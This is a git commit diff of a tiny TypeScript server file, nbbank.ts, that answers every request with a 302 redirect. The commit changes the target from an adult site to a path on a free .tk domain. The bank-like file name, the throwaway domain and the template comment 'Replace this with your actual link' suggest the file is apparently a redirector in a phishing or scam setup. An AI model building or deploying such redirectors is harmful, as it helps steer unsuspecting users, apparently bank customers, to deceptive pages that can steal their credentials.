af148c57bdd2bbf62ab00685c6813fc9df8bb58d
Digital2025001 <bosmichael30@gmail.com>
2025-10-30 14:27:19 -0500

    Update nbbank.ts

--- nbbank.ts
+++ nbbank.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://hotsologirlz.net/", // Replace this with your actual link
+      Location: "https://ib.anonymismus.tk/me/teams/con/", // Replace this with your actual link
     },
   });
 });
